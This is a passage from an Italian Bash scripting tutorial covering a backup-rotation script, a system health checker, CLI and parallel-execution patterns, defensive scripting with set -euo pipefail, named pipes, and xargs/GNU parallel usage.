        # Aggiorna link simbolico
        ln -snf "$backup_path" "$latest_link"

        # Comprimi se richiesto
        if [[ "${CONFIG[compress]}" != "none" ]]; then
            log INFO "Compressione con ${CONFIG[compress]}"
            case "${CONFIG[compress]}" in
                gzip)  tar czf "${backup_path}.tar.gz" -C "$(dirname "$backup_path")" "$(basename "$backup_path")" && rm -rf "$backup_path" ;;
                zstd)  tar --zstd -cf "${backup_path}.tar.zst" -C "$(dirname "$backup_path")" "$(basename "$backup_path")" && rm -rf "$backup_path" ;;
                *)     log WARN "Compressione non supportata: ${CONFIG[compress]}" ;;
            esac
        fi

        log INFO "Backup completato con successo"
    else
        log ERROR "Backup fallito (rsync exit code: $?)"
        exit 1
    fi

    # Post-hook
    if [[ -n "${CONFIG[post_hook]}" ]]; then
        log INFO "Esecuzione post-hook: ${CONFIG[post_hook]}"
        bash -c "${CONFIG[post_hook]}" || log WARN "Post-hook fallito"
    fi
}

# ── Rotazione ───────────────────────────────────────────────────────
rotate_backups() {
    log INFO "Avvio rotazione backup"

    local today
    today=$(date +%u)  # 1=lunedì, 7=domenica
    local day_of_month
    day_of_month=$(date +%d)

    # Promuovi a weekly (ogni domenica)
    if [[ "$today" -eq 7 ]]; then
        local latest_daily
        latest_daily=$(ls -1t "${CONFIG[dest]}/daily/" 2>/dev/null | grep -v latest | head -1)
        if [[ -n "$latest_daily" ]]; then
            cp -al "${CONFIG[dest]}/daily/$latest_daily" "${CONFIG[dest]}/weekly/weekly-$(date +%Y%m%d)" 2>/dev/null || \
            cp -a "${CONFIG[dest]}/daily/$latest_daily" "${CONFIG[dest]}/weekly/weekly-$(date +%Y%m%d)"
            log INFO "Backup weekly creato"
        fi
    fi

    # Promuovi a monthly (primo del mese)
    if [[ "$day_of_month" -eq 1 ]]; then
        local latest_daily
        latest_daily=$(ls -1t "${CONFIG[dest]}/daily/" 2>/dev/null | grep -v latest | head -1)
        if [[ -n "$latest_daily" ]]; then
            cp -al "${CONFIG[dest]}/daily/$latest_daily" "${CONFIG[dest]}/monthly/monthly-$(date +%Y%m)" 2>/dev/null || \
            cp -a "${CONFIG[dest]}/daily/$latest_daily" "${CONFIG[dest]}/monthly/monthly-$(date +%Y%m)"
            log INFO "Backup monthly creato"
        fi
    fi

    # Pulizia: rimuovi backup oltre la retention
    purge_old "${CONFIG[dest]}/daily" "${CONFIG[daily_keep]}" "latest"
    purge_old "${CONFIG[dest]}/weekly" "${CONFIG[weekly_keep]}"
    purge_old "${CONFIG[dest]}/monthly" "${CONFIG[monthly_keep]}"
}

purge_old() {
    local dir="$1"
    local keep="$2"
    local exclude="${3:-}"

    local count
    if [[ -n "$exclude" ]]; then
        count=$(ls -1t "$dir/" 2>/dev/null | grep -v "$exclude" | wc -l)
    else
        count=$(ls -1t "$dir/" 2>/dev/null | wc -l)
    fi

    if (( count > keep )); then
        local to_remove=$(( count - keep ))
        log INFO "Rimozione di $to_remove backup da $dir (mantenuti: $keep)"

        if [[ -n "$exclude" ]]; then
            ls -1t "$dir/" | grep -v "$exclude" | tail -n "$to_remove" | while read -r f; do
                rm -rf "${dir:?}/$f"
                log INFO "Rimosso: $f"
            done
        else
            ls -1t "$dir/" | tail -n "$to_remove" | while read -r f; do
                rm -rf "${dir:?}/$f"
                log INFO "Rimosso: $f"
            done
        fi
    fi
}

# ── Main ────────────────────────────────────────────────────────────
main() {
    local config_file=""

    while getopts ":c:h" opt; do
        case "$opt" in
            c) config_file="$OPTARG" ;;
            h) echo "Uso: $SCRIPT_NAME -c <config.conf>"; exit 0 ;;
            *) echo "Opzione non riconosciuta: -$OPTARG" >&2; exit 1 ;;
        esac
    done

    if [[ -z "$config_file" ]]; then
        echo "Errore: specificare un file di configurazione con -c" >&2
        exit 1
    fi

    load_config "$config_file"
    acquire_lock
    create_backup
    rotate_backups

    log INFO "Operazione completata"
}

main "$@"
```

Esempio di file di configurazione:

```ini
# /etc/backup-rotator.conf
source = /var/www/app
dest = /backup/app
daily_keep = 7
weekly_keep = 4
monthly_keep = 12
compress = zstd
exclude_file = /etc/backup-excludes.txt
pre_hook = systemctl stop app.service
post_hook = systemctl start app.service
log_file = /var/log/backup-rotator.log
```

---

## Progetto 3: System Health Checker

Script completo per il monitoraggio della salute del sistema con output formattato e sistema di alerting:

```bash
#!/bin/bash
#
# health-check.sh — System Health Checker
# Esegue controlli su CPU, memoria, disco, servizi, rete
# Uso: ./health-check.sh [-w] [-m email] [-j]
#

set -euo pipefail

# ── Soglie ──────────────────────────────────────────────────────────
declare -A THRESHOLDS
THRESHOLDS[cpu_warn]=70
THRESHOLDS[cpu_crit]=90
THRESHOLDS[mem_warn]=80
THRESHOLDS[mem_crit]=95
THRESHOLDS[disk_warn]=80
THRESHOLDS[disk_crit]=95
THRESHOLDS[load_warn_factor]=2    # moltiplicatore per numero CPU
THRESHOLDS[swap_warn]=50

# ── Colori ──────────────────────────────────────────────────────────
RED='\033[0;31m'
YELLOW='\033[0;33m'
GREEN='\033[0;32m'
NC='\033[0m'

# ── Stato Globale ───────────────────────────────────────────────────
OVERALL_STATUS="OK"
declare -a ALERTS

update_status() {
    local level="$1"
    local message="$2"

    case "$level" in
        CRITICAL)
            OVERALL_STATUS="CRITICAL"
            ALERTS+=("[CRITICAL] $message")
            ;;
        WARNING)
            [[ "$OVERALL_STATUS" != "CRITICAL" ]] && OVERALL_STATUS="WARNING"
            ALERTS+=("[WARNING] $message")
            ;;
    esac
}

# ── Controlli ───────────────────────────────────────────────────────
check_cpu() {
    echo "─── CPU ───"

    local cpu_usage
    cpu_usage=$(top -bn1 | grep "Cpu(s)" | awk '{print int($2 + $4)}')

    local num_cpus
    num_cpus=$(nproc)

    local load_1 load_5 load_15
    read -r load_1 load_5 load_15 _ < /proc/loadavg

    local color="$GREEN"
    if (( cpu_usage >= THRESHOLDS[cpu_crit] )); then
        color="$RED"
        update_status CRITICAL "CPU usage: ${cpu_usage}%"
    elif (( cpu_usage >= THRESHOLDS[cpu_warn] )); then
        color="$YELLOW"
        update_status WARNING "CPU usage: ${cpu_usage}%"
    fi

    printf "  Utilizzo:     ${color}%d%%${NC}\n" "$cpu_usage"
    printf "  Core:         %d\n" "$num_cpus"
    printf "  Load Average: %s %s %s\n" "$load_1" "$load_5" "$load_15"

    # Processi top CPU
    echo "  Top processi:"
    ps aux --sort=-%cpu | head -4 | tail -3 | awk '{printf "    %-10s %5s%%  %s\n", $1, $3, $11}'
    echo ""
}

check_memory() {
    echo "─── Memoria ───"

    local total used available percent swap_total swap_used swap_percent
    read -r total used available <<< "$(free -m | awk '/^Mem:/ {print $2, $3, $7}')"
    read -r swap_total swap_used <<< "$(free -m | awk '/^Swap:/ {print $2, $3}')"

    percent=$(( used * 100 / total ))

    local color="$GREEN"
    if (( percent >= THRESHOLDS[mem_crit] )); then
        color="$RED"
        update_status CRITICAL "Memoria: ${percent}% (${used}MB/${total}MB)"
    elif (( percent >= THRESHOLDS[mem_warn] )); then
        color="$YELLOW"
        update_status WARNING "Memoria: ${percent}% (${used}MB/${total}MB)"
    fi

    printf "  RAM:          ${color}%d%%${NC} (%dMB / %dMB)\n" "$percent" "$used" "$total"
    printf "  Disponibile:  %dMB\n" "$available"

    if (( swap_total > 0 )); then
        swap_percent=$(( swap_used * 100 / swap_total ))
        printf "  Swap:         %d%% (%dMB / %dMB)\n" "$swap_percent" "$swap_used" "$swap_total"

        if (( swap_percent >= THRESHOLDS[swap_warn] )); then
            update_status WARNING "Swap: ${swap_percent}%"
        fi
    fi

    echo "  Top processi per memoria:"
    ps aux --sort=-%mem | head -4 | tail -3 | awk '{printf "    %-10s %5s%%  %s\n", $1, $4, $11}'
    echo ""
}

check_disk() {
    echo "─── Disco ───"

    while read -r filesystem size used avail percent mountpoint; do
        local pct=${percent%\%}
        local color="$GREEN"

        if (( pct >= THRESHOLDS[disk_crit] )); then
            color="$RED"
            update_status CRITICAL "Disco $mountpoint: ${pct}%"
        elif (( pct >= THRESHOLDS[disk_warn] )); then
            color="$YELLOW"
            update_status WARNING "Disco $mountpoint: ${pct}%"
        fi

        printf "  %-20s ${color}%4s${NC}  (%s usati su %s)  %s\n" \
            "$mountpoint" "$percent" "$used" "$size" "$filesystem"
    done < <(df -h --output=source,size,used,avail,pcent,target -x tmpfs -x devtmpfs 2>/dev/null | tail -n +2)

    # Controllo inode
    echo ""
    echo "  Inode:"
    while read -r filesystem iused ifree ipercent mountpoint; do
        local ipct=${ipercent%\%}
        if (( ipct >= 80 )); then
            printf "    ${YELLOW}%-20s %s inode usati${NC}\n" "$mountpoint" "$ipercent"
            update_status WARNING "Inode $mountpoint: $ipercent"
        fi
    done < <(df -i --output=source,iused,iavail,ipcent,target -x tmpfs -x devtmpfs 2>/dev/null | tail -n +2)
    echo ""
}

check_services() {
    echo "─── Servizi ───"

    local -a critical_services=(
        "sshd"
        "systemd-resolved"
        "cron"
    )

    # Aggiungi servizi specifici se installati
    for svc in nginx apache2 postgresql mysql docker containerd; do
        if systemctl list-unit-files "${svc}.service" &>/dev/null; then
            if systemctl is-enabled "$svc" &>/dev/null; then
                critical_services+=("$svc")
            fi
        fi
    done

    for svc in "${critical_services[@]}"; do
        if systemctl is-active --quiet "$svc" 2>/dev/null; then
            printf "  ${GREEN}●${NC} %-30s attivo\n" "$svc"
        else
            printf "  ${RED}●${NC} %-30s NON ATTIVO\n" "$svc"
            update_status CRITICAL "Servizio $svc non attivo"
        fi
    done

    # Servizi falliti
    local failed
    failed=$(systemctl --state=failed --no-legend 2>/dev/null | wc -l)
    if (( failed > 0 )); then
        echo ""
        echo "  Servizi falliti:"
        systemctl --state=failed --no-legend 2>/dev/null | while read -r unit _; do
            printf "    ${RED}✗${NC} %s\n" "$unit"
        done
        update_status WARNING "$failed servizi in stato failed"
    fi
    echo ""
}

check_network() {
    echo "─── Rete ───"

    # Connettività
    if ping -c 1 -W 3 8.8.8.8 &>/dev/null; then
        printf "  ${GREEN}●${NC} Connettività internet: OK\n"
    else
        printf "  ${RED}●${NC} Connettività internet: FALLITA\n"
        update_status CRITICAL "Nessuna connettività internet"
    fi

    # DNS
    if host google.com &>/dev/null 2>&1; then
        printf "  ${GREEN}●${NC} Risoluzione DNS: OK\n"
    else
        printf "  ${RED}●${NC} Risoluzione DNS: FALLITA\n"
        update_status CRITICAL "Risoluzione DNS fallita"
    fi

    # Porte in ascolto
    echo ""
    echo "  Porte in ascolto:"
    ss -tlnp 2>/dev/null | tail -n +2 | awk '{print $4}' | sort -u | head -15 | while read -r addr; do
        printf "    %s\n" "$addr"
    done

    # Connessioni
    echo ""
    echo "  Connessioni per stato:"
    ss -s 2>/dev/null | grep -E "^(TCP|UDP)" | head -5 | while read -r line; do
        printf "    %s\n" "$line"
    done
    echo ""
}

check_security() {
    echo "─── Sicurezza ───"

    # Aggiornamenti di sicurezza pendenti (Debian/Ubuntu)
    if command -v apt &>/dev/null; then
        local security_updates
        security_updates=$(apt list --upgradable 2>/dev/null | grep -c security || true)
        if (( security_updates > 0 )); then
            printf "  ${YELLOW}!${NC} %d aggiornamenti di sicurezza pendenti\n" "$security_updates"
            update_status WARNING "$security_updates aggiornamenti di sicurezza pendenti"
        else
            printf "  ${GREEN}●${NC} Sistema aggiornato\n"
        fi
    fi

    # Login falliti recenti
    local failed_logins
    failed_logins=$(journalctl -u sshd --since "1 hour ago" 2>/dev/null | grep -c "Failed password" || true)
    if (( failed_logins > 10 )); then
        printf "  ${RED}!${NC} %d tentativi di login falliti nell'ultima ora\n" "$failed_logins"
        update_status WARNING "$failed_logins login SSH falliti nell'ultima ora"
    fi

    # Utenti con UID 0
    local root_users
    root_users=$(awk -F: '$3 == 0 {print $1}' /etc/passwd)
    local root_count
    root_count=$(echo "$root_users" | wc -w)
    if (( root_count > 1 )); then
        printf "  ${RED}!${NC} Utenti con UID 0: %s\n" "$root_users"
        update_status CRITICAL "Utenti multipli con UID 0"
    fi

    echo ""
}

# ── Report Finale ───────────────────────────────────────────────────
print_summary() {
    echo "══════════════════════════════════════════════"

    local status_color
    case "$OVERALL_STATUS" in
        OK)       status_color="$GREEN" ;;
        WARNING)  status_color="$YELLOW" ;;
        CRITICAL) status_color="$RED" ;;
    esac

    printf "  Stato complessivo: ${status_color}%s${NC}\n" "$OVERALL_STATUS"
    printf "  Host: %s\n" "$(hostname -f 2>/dev/null || hostname)"
    printf "  Data: %s\n" "$(date)"
    printf "  Uptime: %s\n" "$(uptime -p)"

    if (( ${#ALERTS[@]} > 0 )); then
        echo ""
        echo "  Alert attivi:"
        for alert in "${ALERTS[@]}"; do
            echo "    $alert"
        done
    fi

    echo "══════════════════════════════════════════════"
}

# ── Main ────────────────────────────────────────────────────────────
main() {
    echo ""
    echo "╔══════════════════════════════════════════════╗"
    echo "║         SYSTEM HEALTH CHECK                  ║"
    echo "║         $(date '+%Y-%m-%d %H:%M:%S')               ║"
    echo "╚══════════════════════════════════════════════╝"
    echo ""

    check_cpu
    check_memory
    check_disk
    check_services
    check_network
    check_security
    print_summary

    # Exit code basato sullo stato
    case "$OVERALL_STATUS" in
        OK)       exit 0 ;;
        WARNING)  exit 1 ;;
        CRITICAL) exit 2 ;;
    esac
}

main "$@"
```

---

## Pattern Avanzati di Scripting

### Pattern: Command Dispatcher

```bash
#!/bin/bash
# Pattern per CLI con sottocomandi (come git, docker, kubectl)

readonly PROG=$(basename "$0")

cmd_start() {
    echo "Avvio servizio..."
}

cmd_stop() {
    echo "Arresto servizio..."
}

cmd_status() {
    echo "Stato: attivo"
}

cmd_help() {
    cat <<EOF
Uso: $PROG <comando> [opzioni]

Comandi:
  start     Avvia il servizio
  stop      Arresta il servizio
  status    Mostra lo stato
  help      Mostra questo help
EOF
}

main() {
    local cmd="${1:-help}"
    shift || true

    if declare -f "cmd_${cmd}" >/dev/null 2>&1; then
        "cmd_${cmd}" "$@"
    else
        echo "Errore: comando '$cmd' non riconosciuto" >&2
        cmd_help >&2
        exit 1
    fi
}

main "$@"
```

### Pattern: Parallel Execution con Controllo

```bash
#!/bin/bash
# Esecuzione parallela con limite di concorrenza

MAX_PARALLEL=4
declare -a PIDS

run_parallel() {
    local cmd="$1"

    # Attendi se abbiamo raggiunto il limite
    while (( ${#PIDS[@]} >= MAX_PARALLEL )); do
        local new_pids=()
        for pid in "${PIDS[@]}"; do
            if kill -0 "$pid" 2>/dev/null; then
                new_pids+=("$pid")
            fi
        done
        PIDS=("${new_pids[@]}")
        sleep 0.1
    done

    eval "$cmd" &
    PIDS+=($!)
}

wait_all() {
    local failed=0
    for pid in "${PIDS[@]}"; do
        if ! wait "$pid"; then
            (( failed++ ))
        fi
    done
    return "$failed"
}

# Uso
servers=("web01" "web02" "web03" "db01" "db02" "cache01" "cache02" "monitor01")

for server in "${servers[@]}"; do
    run_parallel "ssh $server 'sudo apt update && sudo apt upgrade -y' 2>&1 | sed 's/^/[$server] /'"
done

if wait_all; then
    echo "Tutti i server aggiornati con successo"
else
    echo "Alcuni aggiornamenti sono falliti"
fi
```

### Pattern: Configuration File Parser Robusto

```bash
#!/bin/bash
# Parser di file di configurazione INI-like con sezioni

declare -A INI

parse_ini() {
    local file="$1"
    local section="default"
    local line_num=0

    while IFS= read -r line || [[ -n "$line" ]]; do
        (( line_num++ ))

        # Rimuovi commenti e whitespace
        line="${line%%#*}"
        line="${line%%\;*}"
        line=$(echo "$line" | xargs)

        [[ -z "$line" ]] && continue

        # Sezione [nome]
        if [[ "$line" =~ ^\[([a-zA-Z0-9_-]+)\]$ ]]; then
            section="${BASH_REMATCH[1]}"
            continue
        fi

        # Chiave = valore
        if [[ "$line" =~ ^([a-zA-Z0-9_]+)[[:space:]]*=[[:space:]]*(.*)$ ]]; then
            local key="${BASH_REMATCH[1]}"
            local value="${BASH_REMATCH[2]}"
            INI["${section}.${key}"]="$value"
        else
            echo "Errore di sintassi alla riga $line_num: $line" >&2
        fi
    done < "$file"
}

ini_get() {
    local section="$1"
    local key="$2"
    local default="${3:-}"

    echo "${INI[${section}.${key}]:-$default}"
}

# Uso
parse_ini "/etc/myapp/config.ini"
db_host=$(ini_get "database" "host" "localhost")
db_port=$(ini_get "database" "port" "5432")
```

---

## Best Practices

1. **Usa sempre `set -euo pipefail`** all'inizio di ogni script. `-e` interrompe su errori, `-u` errore su variabili non definite, `-o pipefail` propaga errori nelle pipe. Questo triplice guard previene la maggior parte dei bug silenziosi.

2. **Quota sempre le variabili** con doppi apici: `"$var"`, `"${array[@]}"`. Le variabili non quotate sono la causa principale di bug legati a spazi nei nomi di file e word splitting inatteso.

3. **Usa `readonly` per le costanti** e `local` per le variabili nelle funzioni. Questo previene effetti collaterali e rende il codice più leggibile e mantenibile.

4. **Preferisci `[[ ]]` a `[ ]`** per i test condizionali. `[[ ]]` è un costrutto Bash che supporta regex, pattern matching, operatori logici e non richiede quoting delle variabili al suo interno.

5. **Usa `trap EXIT` per la pulizia** di file temporanei, lock file e processi figli. Non fare affidamento sulla pulizia manuale che potrebbe non essere eseguita in caso di errore.

6. **Scrivi funzioni pure quando possibile** — funzioni che dipendono solo dai loro argomenti e non da variabili globali. Quando le globali sono necessarie, documenta la dipendenza.

7. **Gestisci stdin, stdout e stderr correttamente**: messaggi informativi e di errore su stderr (`>&2`), solo dati su stdout. Questo permette il piping sicuro dell'output.

8. **Valida tutti gli input** — argomenti da linea di comando, file di configurazione, variabili d'ambiente. Non assumere mai che l'input sia corretto o presente.

9. **Usa `mktemp` per file temporanei**, mai percorsi hard-coded in `/tmp`. `mktemp` previene race condition e conflitti tra istanze parallele.

10. **Documenta le assunzioni e le dipendenze** all'inizio dello script: versione di Bash richiesta, comandi esterni necessari, permessi richiesti.

---

## Defensive Scripting

Lo scripting difensivo è la disciplina di scrivere codice che fallisce in modo esplicito, prevedibile e sicuro. In Bash il comportamento predefinito è pericolosamente permissivo: un comando può fallire silenziosamente e lo script continua come se nulla fosse accaduto. Le tecniche in questa sezione trasformano gli errori silenziosi in fallimenti controllati.

### `set -euo pipefail` — Analisi Dettagliata

```bash
#!/usr/bin/env bash
set -euo pipefail
```

Ciascuna opzione ha semantica precisa e caveat che vanno compresi a fondo:

#### `set -e` (errexit)

Interrompe lo script quando un comando restituisce un exit code diverso da zero.

**Caveat 1 — Subshell e command substitution:**

`set -e` **non** si propaga automaticamente nelle subshell create da `$()`:

```bash
set -e

# Questo NON interrompe lo script!
result=$(false; echo "questa riga viene eseguita comunque")
echo "Continua normalmente — result='$result'"

# Per propagare errexit nelle subshell:
# Opzione A: shopt -s inherit_errexit (Bash 4.4+)
shopt -s inherit_errexit
result=$(false; echo "questa riga NON viene eseguita")  # Lo script si ferma

# Opzione B: set -e esplicito nella subshell
result=$(set -e; false; echo "questa riga NON viene eseguita")
```

Riferimento: Bash Reference Manual, sezione 4.3.1 «The Set Builtin», flag `-e`.
Consultato: 2026-05-23.

**Caveat 2 — Comandi in contesto condizionale:**

`set -e` è disabilitato per comandi che fanno parte di una condizione `if`, `while`, `until`, o che si trovano a sinistra di `&&`/`||`:

```bash
set -e

# Qui `false` NON interrompe lo script — è in contesto condizionale
if false; then
    echo "non raggiunto"
fi

# Anche qui: la parte sinistra di && è un contesto condizionale
false && echo "nope"
echo "Lo script continua"  # Viene eseguito

# ATTENZIONE: il guard pattern || può mascherare errori in funzioni
do_something() {
    step_one    # se fallisce, errexit lo catturerebbe...
    step_two    # ...ma solo se do_something NON è chiamata in contesto condizionale
}
do_something || echo "fallito"  # Tutto il corpo di do_something perde errexit!
```

**Caveat 3 — Aritmetica che restituisce zero:**

```bash
set -e
count=0
(( count++ ))  # Exit code 1! Perché (( )) restituisce 1 quando il risultato è 0
# Lo script si interrompe qui

# Soluzione: aggiungere || true, o usare la forma (( count++ )) || true
(( count++ )) || true
# Oppure:
count=$(( count + 1 ))
```

#### `set -u` (nounset)

Genera un errore quando si espande una variabile non definita:

```bash
set -u

echo "$VARIABILE_INESISTENTE"
# bash: VARIABILE_INESISTENTE: unbound variable

# Pattern sicuro: valori default
echo "${VARIABILE_INESISTENTE:-valore_default}"
echo "${VARIABILE_INESISTENTE:=assegnato_e_usato}"

# Verifica esistenza senza errore
if [[ -v VARIABILE_INESISTENTE ]]; then
    echo "Definita"
fi

# Caveat: array vuoti con -u
declare -a arr=()
echo "${arr[@]}"  # Errore con Bash < 4.4!
# Soluzione per Bash < 4.4:
echo "${arr[@]+"${arr[@]}"}"
```

#### `set -o pipefail`

Fa sì che una pipeline restituisca l'exit code del primo comando che fallisce, anziché l'ultimo:

```bash
set -o pipefail

# Senza pipefail: exit code = 0 (tail riesce)
false | tail -1
echo $?  # 0

# Con pipefail: exit code = 1 (false fallisce)
set -o pipefail
false | tail -1
echo $?  # 1

# Caveat: PIPESTATUS per diagnostica
set -o pipefail
cmd1 | cmd2 | cmd3
echo "Exit codes: ${PIPESTATUS[0]} ${PIPESTATUS[1]} ${PIPESTATUS[2]}"
```

### `shopt -s failglob nullglob`

```bash
# failglob: errore se un glob non ha match
shopt -s failglob
ls *.xyz  # bash: no match: *.xyz (errore anziché letterale "*.xyz")

# nullglob: glob senza match si espande a stringa vuota
shopt -s nullglob
files=(*.xyz)
echo "${#files[@]}"  # 0 (anziché l'array con un elemento letterale "*.xyz")

# In script difensivi, preferire nullglob per iterazioni sicure:
shopt -s nullglob
for f in /var/log/*.log; do
    echo "Processo: $f"
done
# Se non ci sono .log, il ciclo semplicemente non esegue — nessun errore

# globstar: ** ricorsivo (Bash 4.0+)
shopt -s globstar
for f in /etc/**/*.conf; do
    echo "$f"
done
```

### Template Completo di Script Difensivo

```bash
#!/usr/bin/env bash
#
# template-difensivo.sh — Template base per script production-ready
#
# Uso: ./template-difensivo.sh [opzioni]
#
# Dipendenze: bash >= 4.4, coreutils
# Autore: <nome>
# Versione: 1.0.0
#

# ── Strict mode ────────────────────────────────────────────────────
set -euo pipefail
shopt -s inherit_errexit nullglob
IFS=$'\n\t'

# ── Costanti ───────────────────────────────────────────────────────
readonly SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
readonly SCRIPT_NAME="$(basename "${BASH_SOURCE[0]}")"
readonly SCRIPT_VERSION="1.0.0"

# ── Risorse da pulire ─────────────────────────────────────────────
TMPDIR_PATH=""

cleanup() {
    local rc=$?
    # Termina processi figli
    local children
    children=$(jobs -pr 2>/dev/null) || true
    if [[ -n "$children" ]]; then
        kill $children 2>/dev/null || true
        wait $children 2>/dev/null || true
    fi
    # Rimuovi temporanei
    [[ -n "$TMPDIR_PATH" && -d "$TMPDIR_PATH" ]] && rm -rf "$TMPDIR_PATH"
    exit "$rc"
}
trap cleanup EXIT
trap 'exit 2' INT TERM HUP

# ── Funzioni di utilità ────────────────────────────────────────────
die() { printf '%s: errore: %s\n' "$SCRIPT_NAME" "$*" >&2; exit 1; }

require_cmd() {
    local cmd
    for cmd in "$@"; do
        command -v "$cmd" >/dev/null 2>&1 || die "comando richiesto non trovato: $cmd"
    done
}

require_cmd awk grep sed

# ── Main ───────────────────────────────────────────────────────────
main() {
    TMPDIR_PATH="$(mktemp -d)"
    # ... logica dello script ...
}

main "$@"
```

Riferimento: POSIX.1-2024, sezione 2.14 «Special Built-In Utilities», descrizione di `set`.
Consultato: 2026-05-23.

---

## Named Pipes e FIFO

Le named pipes (FIFO — First In, First Out) sono file speciali nel filesystem che implementano un canale di comunicazione unidirezionale tra processi. A differenza delle pipe anonime create con `|`, le named pipe hanno un nome nel filesystem e possono essere utilizzate da processi non imparentati.

### Creazione e Meccanica

```bash
# Creazione di una named pipe
mkfifo /tmp/mia_pipe
ls -l /tmp/mia_pipe
# prw-r--r-- 1 user user 0 ... /tmp/mia_pipe
#  ^--- la 'p' indica un file pipe

# Creazione con permessi specifici
mkfifo -m 0600 /tmp/pipe_privata

# La scrittura blocca fino a quando un lettore non apre la pipe (e viceversa)
# Terminale 1:
echo "messaggio" > /tmp/mia_pipe    # Bloccato fino a che qualcuno legge

# Terminale 2:
cat < /tmp/mia_pipe                 # Riceve "messaggio", entrambi si sbloccano
```

### Pattern: Producer-Consumer con FIFO

```bash
#!/usr/bin/env bash
set -euo pipefail

FIFO="/tmp/producer_consumer_$$"
mkfifo "$FIFO"
trap 'rm -f "$FIFO"' EXIT

# Producer: genera dati
producer() {
    for i in $(seq 1 100); do
        echo "task-$i"
        sleep 0.01
    done > "$FIFO"
}

# Consumer: elabora dati
consumer() {
    local count=0
    while IFS= read -r task; do
        echo "[$$] Elaboro: $task"
        (( count++ ))
    done < "$FIFO"
    echo "Elaborati $count task"
}

producer &
consumer
wait
```

### Pattern: Multipli Writer su una FIFO

```bash
#!/usr/bin/env bash
set -euo pipefail

FIFO="/tmp/multi_writer_$$"
mkfifo "$FIFO"
trap 'rm -f "$FIFO"' EXIT

# Tre writer paralleli
for worker_id in 1 2 3; do
    (
        for i in $(seq 1 5); do
            # Scrivi una riga atomica (<= PIPE_BUF, tipicamente 4096 byte)
            printf 'worker=%d item=%d timestamp=%s\n' \
                "$worker_id" "$i" "$(date +%s.%N)"
        done > "$FIFO"
    ) &
done

# Singolo reader — raccoglie tutte le righe
count=0
while IFS= read -r line; do
    echo "Ricevuto: $line"
    (( count++ ))
    (( count >= 15 )) && break  # 3 worker × 5 item
done < "$FIFO"

wait
echo "Totale righe ricevute: $count"
```

### FIFO Bidirezionale (due FIFO)

```bash
#!/usr/bin/env bash
set -euo pipefail

REQUEST_PIPE="/tmp/req_$$"
RESPONSE_PIPE="/tmp/resp_$$"
mkfifo "$REQUEST_PIPE" "$RESPONSE_PIPE"
trap 'rm -f "$REQUEST_PIPE" "$RESPONSE_PIPE"' EXIT

# Server: legge richieste, scrive risposte
server() {
    while IFS= read -r request; do
        case "$request" in
            PING)   echo "PONG" ;;
            TIME)   date +%s ;;
            QUIT)   echo "BYE"; break ;;
            *)      echo "ERR: comando sconosciuto: $request" ;;
        esac
    done < "$REQUEST_PIPE" > "$RESPONSE_PIPE"
}

server &
SERVER_PID=$!

# Client: invia richieste, legge risposte
{
    echo "PING"
    echo "TIME"
    echo "QUIT"
} > "$REQUEST_PIPE" &

while IFS= read -r response; do
    echo "Risposta dal server: $response"
    [[ "$response" == "BYE" ]] && break
done < "$RESPONSE_PIPE"

wait "$SERVER_PID" 2>/dev/null || true
```

### Differenze tra Named Pipe e Process Substitution

| Caratteristica | Named Pipe (`mkfifo`) | Process Substitution (`<()`) |
|---|---|---|
| Visibilità nel filesystem | Sì, percorso permanente | Temporaneo, `/dev/fd/N` |
| Comunicazione tra processi non imparentati | Sì | No |
| Persistenza | Fino a `rm` | Automatica |
| Bidirezionale | Sì (con due pipe) | No |
| Portabilità POSIX | Sì (`mkfifo` è POSIX) | No (estensione Bash/ksh/zsh) |

Riferimento: POSIX.1-2024, sezione su `mkfifo`. `man 7 fifo`. Consultato: 2026-05-23.

---

## Esecuzione Parallela

L'esecuzione parallela in Bash permette di sfruttare i core della CPU e di ridurre drasticamente i tempi di attesa per operazioni I/O-bound. Questa sezione copre i pattern fondamentali: job control nativo, `xargs -P`, GNU parallel, e il coordinamento con `wait`.

### Background Jobs e `wait`

```bash
#!/usr/bin/env bash
set -euo pipefail

# Avvio di job in background
process_server() {
    local server="$1"
    echo "[$(date +%T)] Inizio $server"
    ssh "$server" 'uptime; df -h / | tail -1' 2>/dev/null
    echo "[$(date +%T)] Fine $server"
}

declare -A JOB_PIDS

for server in web0{1..4}.example.com; do
    process_server "$server" &
    JOB_PIDS[$server]=$!
done

# Attendi tutti e raccogli gli exit code
declare -A JOB_RESULTS
failures=0
for server in "${!JOB_PIDS[@]}"; do
    if wait "${JOB_PIDS[$server]}"; then
        JOB_RESULTS[$server]="OK"
    else
        JOB_RESULTS[$server]="FAIL ($?)"
        (( failures++ ))
    fi
done

# Report
for server in "${!JOB_RESULTS[@]}"; do
    printf '%-30s %s\n' "$server" "${JOB_RESULTS[$server]}"
done
echo "Fallimenti: $failures"
```

### `xargs -P` — Parallelismo Semplice

```bash
# Esecuzione parallela di comandi con xargs
# -P N: massimo N processi paralleli
# -I {}: placeholder per l'argomento

# Compressione parallela di file
find /var/log -name '*.log' -size +1M -print0 \
    | xargs -0 -P "$(nproc)" -I {} gzip --best {}

# Ping parallelo a una lista di host
printf '%s\n' host{1..20}.example.com \
    | xargs -P 10 -I {} sh -c 'ping -c 1 -W 2 {} >/dev/null 2>&1 && echo "UP: {}" || echo "DOWN: {}"'

# Download parallelo
cat urls.txt | xargs -P 4 -I {} wget -q {}

# Attenzione: xargs -P non garantisce ordine di output.
# Per output ordinato, redirigere ciascun job su file e poi concatenare.
```

### GNU Parallel

GNU parallel offre funzionalità molto più avanzate di `xargs -P`: gestione dell'output, barra di progresso, ripresa dopo interruzione, distribuzione remota.

```bash
# Installazione: sudo apt install parallel   # Debian/Ubuntu
#                sudo dnf install parallel   # Fedora/RHEL

# Base: esegui command su ogni riga di input, 4 job paralleli
parallel -j 4 gzip ::: *.log

# Con placeholder e sostituzione
parallel -j "$(nproc)" 'convert {} -resize 800x600 resized/{/}' ::: images/*.jpg

# Input da file
parallel -j 8 -a servers.txt ssh {} 'uptime'

# Barra di progresso
parallel --bar -j 4 'sleep {}; echo "Done {}"' ::: $(seq 1 20)

# Retry automatico su fallimento
parallel --retries 3 -j 4 'curl -sf {} -o /dev/null' ::: $(cat urls.txt)

# Output ordinato (come se fosse sequenziale)
parallel --keep-order -j 4 'echo "Processing {}"; sleep 1' ::: A B C D E

# Distribuzione su macchine remote
parallel -S server1,server2,server3 -j 2 \
    'cd /data && process_file {}' ::: file{1..100}.csv

# Dry run: mostra i comandi senza eseguirli
parallel --dry-run -j 4 'gzip {}' ::: *.log

# Resume: riprendi da dove si era interrotto
parallel --joblog /tmp/parallel.log --resume -j 4 \
